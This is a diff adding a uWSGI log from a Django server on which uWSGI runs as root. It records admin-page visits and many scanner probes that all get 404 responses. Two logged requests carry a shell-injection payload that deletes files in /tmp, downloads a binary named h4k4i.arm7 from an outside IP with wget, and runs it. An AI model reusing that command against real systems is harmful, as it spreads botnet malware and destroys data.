@@ -1,0 +1,242 @@
+
+*** Starting uWSGI 2.0.19.1 (64bit) on [Tue Sep  8 16:16:16 2020] ***
+compiled with version: 8.3.1 20191121 (Red Hat 8.3.1-5) on 06 September 2020 04:09:07
+os: Linux-4.18.0-147.5.1.el8_1.x86_64 #1 SMP Wed Feb 5 02:00:39 UTC 2020
+nodename: Bruce
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /usr/project/www/Django/SuperBruce
+writing pidfile to /usr/project/www/Django/SuperBruce/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /usr/project/www/Django/SuperBruce
+your processes number limit is 6873
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:9000 fd 6
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.8 (default, Nov 21 2019, 19:31:34)  [GCC 8.3.1 20190507 (Red Hat 8.3.1-4)]
+PEP 405 virtualenv detected: /usr/project/www/Django/venv
+Set PythonHome to /usr/project/www/Django/venv
+Python main interpreter initialized at 0x264c590
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 2256864 bytes (2203 KB) for 150 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x264c590 pid: 26851 (default app)
+mountpoint  already configured. skip.
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 26851)
+spawned uWSGI worker 1 (pid: 26853, cores: 30)
+spawned uWSGI worker 2 (pid: 26854, cores: 30)
+spawned uWSGI worker 3 (pid: 26855, cores: 30)
+spawned uWSGI worker 4 (pid: 26856, cores: 30)
+spawned uWSGI worker 5 (pid: 26857, cores: 30)
+[pid: 26853|app: 0|req: 1/1] 183.15.176.137 () {44 vars in 846 bytes} [Tue Sep  8 08:17:16 2020] GET / => generated 179 bytes in 14 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26853|app: 0|req: 2/2] 183.15.176.137 () {44 vars in 853 bytes} [Tue Sep  8 08:17:22 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26853|app: 0|req: 3/3] 183.15.176.137 () {42 vars in 992 bytes} [Tue Sep  8 08:18:18 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26857|app: 0|req: 1/4] 183.15.176.137 () {42 vars in 959 bytes} [Tue Sep  8 08:18:19 2020] GET /favicon.ico => generated 179 bytes in 16 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26857|app: 0|req: 2/5] 183.15.176.137 () {42 vars in 832 bytes} [Tue Sep  8 08:18:48 2020] GET /admin => generated 0 bytes in 1 msecs (HTTP/1.1 301) 5 headers in 175 bytes (1 switches on core 6)
+[pid: 26853|app: 0|req: 4/6] 183.15.176.137 () {42 vars in 834 bytes} [Tue Sep  8 08:18:48 2020] GET /admin/ => generated 0 bytes in 10 msecs (HTTP/1.1 302) 9 headers in 331 bytes (1 switches on core 0)
+[pid: 26853|app: 0|req: 5/7] 183.15.176.137 () {42 vars in 871 bytes} [Tue Sep  8 08:18:48 2020] GET /admin/login/?next=/admin/ => generated 2309 bytes in 20 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 4)
+[pid: 26853|app: 0|req: 6/8] 183.15.176.137 () {42 vars in 828 bytes} [Tue Sep  8 08:18:48 2020] GET /usr/project/www/Django/static/admin/css/base.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26855|app: 0|req: 1/9] 183.15.176.137 () {42 vars in 842 bytes} [Tue Sep  8 08:18:48 2020] GET /usr/project/www/Django/static/admin/css/nav_sidebar.css => generated 179 bytes in 15 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26853|app: 0|req: 7/10] 183.15.176.137 () {42 vars in 830 bytes} [Tue Sep  8 08:18:48 2020] GET /usr/project/www/Django/static/admin/css/login.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26854|app: 0|req: 1/11] 183.15.176.137 () {42 vars in 840 bytes} [Tue Sep  8 08:18:48 2020] GET /usr/project/www/Django/static/admin/css/responsive.css => generated 179 bytes in 14 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26857|app: 0|req: 3/12] 183.15.176.137 () {42 vars in 823 bytes} [Tue Sep  8 08:18:48 2020] GET /usr/project/www/Django/static/admin/js/nav_sidebar.js => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
+[pid: 26853|app: 0|req: 8/13] 183.15.176.137 () {44 vars in 902 bytes} [Tue Sep  8 08:21:13 2020] GET /admin/login/?next=/admin/ => generated 2309 bytes in 4 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 5)
+[pid: 26855|app: 0|req: 2/14] 183.15.176.137 () {42 vars in 828 bytes} [Tue Sep  8 08:21:13 2020] GET /usr/project/www/Django/static/admin/css/base.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 25)
+[pid: 26856|app: 0|req: 1/15] 183.15.176.137 () {42 vars in 842 bytes} [Tue Sep  8 08:21:13 2020] GET /usr/project/www/Django/static/admin/css/nav_sidebar.css => generated 179 bytes in 14 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26853|app: 0|req: 9/16] 183.15.176.137 () {42 vars in 823 bytes} [Tue Sep  8 08:21:13 2020] GET /usr/project/www/Django/static/admin/js/nav_sidebar.js => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26857|app: 0|req: 4/17] 183.15.176.137 () {42 vars in 830 bytes} [Tue Sep  8 08:21:13 2020] GET /usr/project/www/Django/static/admin/css/login.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
+[pid: 26857|app: 0|req: 5/18] 183.15.176.137 () {42 vars in 840 bytes} [Tue Sep  8 08:21:13 2020] GET /usr/project/www/Django/static/admin/css/responsive.css => generated 179 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
+[pid: 26853|app: 0|req: 10/19] 183.15.176.137 () {44 vars in 902 bytes} [Tue Sep  8 08:21:19 2020] GET /admin/login/?next=/admin/ => generated 2309 bytes in 5 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 5)
+[pid: 26855|app: 0|req: 3/20] 183.15.176.137 () {42 vars in 828 bytes} [Tue Sep  8 08:21:19 2020] GET /usr/project/www/Django/static/admin/css/base.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 25)
+[pid: 26857|app: 0|req: 6/21] 183.15.176.137 () {42 vars in 842 bytes} [Tue Sep  8 08:21:19 2020] GET /usr/project/www/Django/static/admin/css/nav_sidebar.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
+[pid: 26854|app: 0|req: 2/22] 183.15.176.137 () {42 vars in 830 bytes} [Tue Sep  8 08:21:19 2020] GET /usr/project/www/Django/static/admin/css/login.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26854|app: 0|req: 3/23] 183.15.176.137 () {42 vars in 840 bytes} [Tue Sep  8 08:21:19 2020] GET /usr/project/www/Django/static/admin/css/responsive.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26856|app: 0|req: 2/24] 183.15.176.137 () {42 vars in 823 bytes} [Tue Sep  8 08:21:19 2020] GET /usr/project/www/Django/static/admin/js/nav_sidebar.js => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 24)
+[pid: 26853|app: 0|req: 11/25] 183.15.176.137 () {42 vars in 1041 bytes} [Tue Sep  8 08:24:06 2020] GET /admin/login/?next=/admin/ => generated 2309 bytes in 5 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 5)
+[pid: 26855|app: 0|req: 4/26] 183.15.176.137 () {44 vars in 1082 bytes} [Tue Sep  8 08:24:06 2020] GET /usr/project/www/Django/static/admin/css/base.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 25)
+[pid: 26855|app: 0|req: 5/27] 183.15.176.137 () {44 vars in 1084 bytes} [Tue Sep  8 08:24:06 2020] GET /usr/project/www/Django/static/admin/css/login.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 25)
+[pid: 26857|app: 0|req: 7/28] 183.15.176.137 () {44 vars in 1096 bytes} [Tue Sep  8 08:24:06 2020] GET /usr/project/www/Django/static/admin/css/nav_sidebar.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
+[pid: 26854|app: 0|req: 4/29] 183.15.176.137 () {44 vars in 1094 bytes} [Tue Sep  8 08:24:06 2020] GET /usr/project/www/Django/static/admin/css/responsive.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26856|app: 0|req: 3/30] 183.15.176.137 () {44 vars in 1077 bytes} [Tue Sep  8 08:24:06 2020] GET /usr/project/www/Django/static/admin/js/nav_sidebar.js => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 24)
+[pid: 26854|app: 0|req: 5/31] 183.15.176.137 () {44 vars in 1073 bytes} [Tue Sep  8 08:24:06 2020] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26853|app: 0|req: 12/32] 183.15.176.137 () {44 vars in 1130 bytes} [Tue Sep  8 09:19:07 2020] GET /admin/login/?next=/admin/ => generated 2309 bytes in 4 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 5)
+[pid: 26855|app: 0|req: 6/33] 183.15.176.137 () {44 vars in 1082 bytes} [Tue Sep  8 09:19:07 2020] GET /usr/project/www/Django/static/admin/css/base.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 25)
+[pid: 26855|app: 0|req: 7/34] 183.15.176.137 () {44 vars in 1096 bytes} [Tue Sep  8 09:19:07 2020] GET /usr/project/www/Django/static/admin/css/nav_sidebar.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 25)
+[pid: 26857|app: 0|req: 8/35] 183.15.176.137 () {44 vars in 1084 bytes} [Tue Sep  8 09:19:07 2020] GET /usr/project/www/Django/static/admin/css/login.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
+[pid: 26854|app: 0|req: 6/36] 183.15.176.137 () {44 vars in 1077 bytes} [Tue Sep  8 09:19:07 2020] GET /usr/project/www/Django/static/admin/js/nav_sidebar.js => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26856|app: 0|req: 4/37] 183.15.176.137 () {44 vars in 1094 bytes} [Tue Sep  8 09:19:07 2020] GET /usr/project/www/Django/static/admin/css/responsive.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 24)
+[pid: 26854|app: 0|req: 7/38] 183.15.176.137 () {44 vars in 1073 bytes} [Tue Sep  8 09:19:08 2020] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26853|app: 0|req: 13/39] 183.15.176.137 () {44 vars in 1081 bytes} [Tue Sep  8 09:19:13 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26855|app: 0|req: 8/40] 183.15.176.137 () {44 vars in 1048 bytes} [Tue Sep  8 09:19:14 2020] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 25)
+[pid: 26853|app: 0|req: 14/41] 45.148.10.28 () {48 vars in 884 bytes} [Tue Sep  8 09:27:01 2020] POST /boaform/admin/formLogin => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 15/42] 74.120.14.33 () {28 vars in 318 bytes} [Tue Sep  8 10:03:22 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26855|app: 0|req: 9/43] 74.120.14.33 () {34 vars in 450 bytes} [Tue Sep  8 10:03:22 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 25)
+[pid: 26853|app: 0|req: 16/44] 190.94.140.236 () {30 vars in 446 bytes} [Tue Sep  8 10:39:43 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 17/45] 34.76.78.209 () {42 vars in 572 bytes} [Tue Sep  8 10:42:36 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 18/46] 192.35.168.250 () {28 vars in 320 bytes} [Tue Sep  8 10:56:56 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26855|app: 0|req: 10/47] 192.35.168.250 () {34 vars in 452 bytes} [Tue Sep  8 10:56:57 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 25)
+[pid: 26853|app: 0|req: 19/48] 185.226.143.178 () {32 vars in 475 bytes} [Tue Sep  8 10:59:33 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 20/49] 39.107.14.208 () {26 vars in 290 bytes} [Tue Sep  8 11:41:57 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.0 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 21/50] 115.85.32.210 () {36 vars in 487 bytes} [Tue Sep  8 11:48:08 2020] POST /cgi-bin/mainfunction.cgi => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 22/51] 192.35.168.32 () {34 vars in 402 bytes} [Tue Sep  8 12:23:00 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 23/52] 80.82.70.187 () {32 vars in 442 bytes} [Tue Sep  8 12:32:48 2020] GET /cache/global/img/gs.gif => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 24/53] 78.169.196.129 () {32 vars in 474 bytes} [Tue Sep  8 12:34:29 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 25/54] 192.241.235.202 () {34 vars in 428 bytes} [Tue Sep  8 12:53:46 2020] GET /ReportServer => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 26/55] 192.241.223.188 () {34 vars in 416 bytes} [Tue Sep  8 12:59:52 2020] GET /hudson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 27/56] 221.226.67.42 () {28 vars in 332 bytes} [Tue Sep  8 13:13:47 2020] GET /systemInfo => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 28/57] 114.215.24.234 () {26 vars in 291 bytes} [Tue Sep  8 13:48:46 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.0 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 29/58] 183.136.225.56 () {34 vars in 465 bytes} [Tue Sep  8 15:38:59 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 30/59] 128.14.134.170 () {34 vars in 497 bytes} [Tue Sep  8 16:22:30 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 31/60] 167.249.102.94 () {32 vars in 473 bytes} [Tue Sep  8 16:26:16 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 32/61] 109.94.113.119 () {32 vars in 473 bytes} [Tue Sep  8 18:04:34 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 33/62] 47.101.63.156 () {34 vars in 468 bytes} [Tue Sep  8 18:21:45 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 34/63] 47.103.129.223 () {38 vars in 655 bytes} [Tue Sep  8 18:35:16 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26855|app: 0|req: 11/64] 47.103.129.223 () {38 vars in 701 bytes} [Tue Sep  8 18:35:16 2020] GET /explicit_not_exist_path => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 25)
+[pid: 26856|app: 0|req: 5/65] 47.103.129.223 () {38 vars in 675 bytes} [Tue Sep  8 18:35:16 2020] GET /index.html => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 24)
+[pid: 26857|app: 0|req: 9/66] 47.103.129.223 () {38 vars in 673 bytes} [Tue Sep  8 18:35:16 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
+[pid: 26854|app: 0|req: 8/67] 47.103.129.223 () {38 vars in 673 bytes} [Tue Sep  8 18:35:16 2020] GET /index.jsp => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26853|app: 0|req: 35/68] 47.103.129.223 () {38 vars in 667 bytes} [Tue Sep  8 18:35:17 2020] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 331 bytes (1 switches on core 5)
+[pid: 26855|app: 0|req: 12/69] 47.103.129.223 () {38 vars in 704 bytes} [Tue Sep  8 18:35:17 2020] GET /admin/login/?next=/admin/ => generated 2309 bytes in 28 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 25)
+[pid: 26853|app: 0|req: 36/70] 47.103.129.223 () {40 vars in 766 bytes} [Tue Sep  8 18:35:17 2020] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26857|app: 0|req: 10/71] 47.103.129.223 () {40 vars in 764 bytes} [Tue Sep  8 18:35:17 2020] GET /robots.txt => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
+[pid: 26854|app: 0|req: 9/72] 47.103.129.223 () {40 vars in 760 bytes} [Tue Sep  8 18:35:17 2020] GET /404.html => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26856|app: 0|req: 6/73] 47.103.129.223 () {40 vars in 760 bytes} [Tue Sep  8 18:35:17 2020] GET /500.html => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 24)
+[pid: 26855|app: 0|req: 13/74] 47.103.129.223 () {40 vars in 798 bytes} [Tue Sep  8 18:35:17 2020] GET /stylesheets/application.css => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 4)
+[pid: 26856|app: 0|req: 7/75] 47.103.129.223 () {40 vars in 800 bytes} [Tue Sep  8 18:35:17 2020] GET /r/cms/www/red/img/prompt.jpg => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 24)
+[pid: 26854|app: 0|req: 10/76] 47.103.129.223 () {40 vars in 810 bytes} [Tue Sep  8 18:35:17 2020] GET /r/cms/www/red/style/swiper.min.js => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26853|app: 0|req: 37/77] 47.103.129.223 () {40 vars in 752 bytes} [Tue Sep  8 18:35:17 2020] GET /wcm/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26855|app: 0|req: 14/78] 47.103.129.223 () {40 vars in 766 bytes} [Tue Sep  8 18:35:17 2020] GET /phpMyAdmin/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 4)
+[pid: 26857|app: 0|req: 11/79] 47.103.129.223 () {40 vars in 766 bytes} [Tue Sep  8 18:35:17 2020] GET /phpmyadmin/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
+[pid: 26853|app: 0|req: 38/80] 41.37.118.236 () {34 vars in 707 bytes} [Tue Sep  8 18:37:17 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+185.132.53.147/hakaibin/h4k4i.arm7;chmod+777+/tmp/h4k4i.arm7;sh+/tmp/h4k4i.arm7+hakai.Rep.Jaws => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 39/81] 178.128.18.192 () {30 vars in 344 bytes} [Tue Sep  8 18:55:34 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 40/82] 192.241.237.121 () {34 vars in 404 bytes} [Tue Sep  8 19:04:58 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 41/83] 102.46.28.117 () {34 vars in 707 bytes} [Tue Sep  8 19:45:08 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+185.132.53.147/hakaibin/h4k4i.arm7;chmod+777+/tmp/h4k4i.arm7;sh+/tmp/h4k4i.arm7+hakai.Rep.Jaws => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 42/84] 201.49.239.163 () {32 vars in 474 bytes} [Tue Sep  8 20:02:00 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 43/85] 189.90.112.146 () {32 vars in 473 bytes} [Tue Sep  8 20:24:30 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 44/86] 185.165.173.29 () {32 vars in 473 bytes} [Tue Sep  8 21:33:03 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 45/87] 80.82.70.187 () {32 vars in 442 bytes} [Tue Sep  8 22:15:07 2020] GET /cache/global/img/gs.gif => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 46/88] 102.165.30.53 () {30 vars in 449 bytes} [Tue Sep  8 22:24:33 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.0 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 47/89] 101.132.79.157 () {34 vars in 436 bytes} [Tue Sep  8 22:35:27 2020] GET / => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 5)
+[pid: 26853|app: 0|req: 48/90] 191.17.74.224 () {32 vars in 479 bytes} [Tue Sep  8 23:41:05 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 49/91] 106.14.11.104 () {34 vars in 468 bytes} [Tue Sep  8 23:51:07 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 50/92] 189.126.230.43 () {32 vars in 473 bytes} [Wed Sep  9 01:52:58 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 51/93] 183.136.225.56 () {34 vars in 544 bytes} [Wed Sep  9 01:59:48 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 52/94] 106.75.211.211 () {34 vars in 523 bytes} [Wed Sep  9 02:00:13 2020] GET /404/search_children.js => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 53/95] 192.241.224.160 () {34 vars in 432 bytes} [Wed Sep  9 03:59:12 2020] GET /portal/redlion => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 54/96] 94.183.237.207 () {36 vars in 531 bytes} [Wed Sep  9 04:35:00 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 55/97] 47.94.39.226 () {26 vars in 289 bytes} [Wed Sep  9 05:47:06 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.0 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 56/98] 45.148.10.28 () {48 vars in 884 bytes} [Wed Sep  9 06:12:20 2020] POST /boaform/admin/formLogin => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 57/99] 193.118.53.194 () {34 vars in 497 bytes} [Wed Sep  9 06:21:37 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 58/100] 183.136.225.56 () {34 vars in 544 bytes} [Wed Sep  9 07:46:34 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 59/101] 80.82.70.187 () {32 vars in 442 bytes} [Wed Sep  9 07:56:33 2020] GET /cache/global/img/gs.gif => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 60/102] 119.23.138.247 () {26 vars in 291 bytes} [Wed Sep  9 08:17:40 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.0 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26853|app: 0|req: 61/103] 122.13.163.181 () {34 vars in 509 bytes} [Wed Sep  9 09:09:28 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26854|app: 0|req: 11/104] 122.13.163.181 () {34 vars in 509 bytes} [Wed Sep  9 09:09:28 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 26857|app: 0|req: 12/105] 122.13.163.181 () {34 vars in 509 bytes} [Wed Sep  9 09:09:28 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 6)
+[pid: 26853|app: 0|req: 62/106] 113.89.33.12 () {40 vars in 736 bytes} [Wed Sep  9 09:23:30 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 20)
+[pid: 26855|app: 0|req: 15/107] 113.89.33.12 () {40 vars in 680 bytes} [Wed Sep  9 09:23:31 2020] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 4)
+[pid: 26853|app: 0|req: 63/108] 113.89.33.12 () {40 vars in 746 bytes} [Wed Sep  9 09:23:37 2020] GET /admin => generated 0 bytes in 0 msecs (HTTP/1.1 301) 5 headers in 175 bytes (1 switches on core 20)
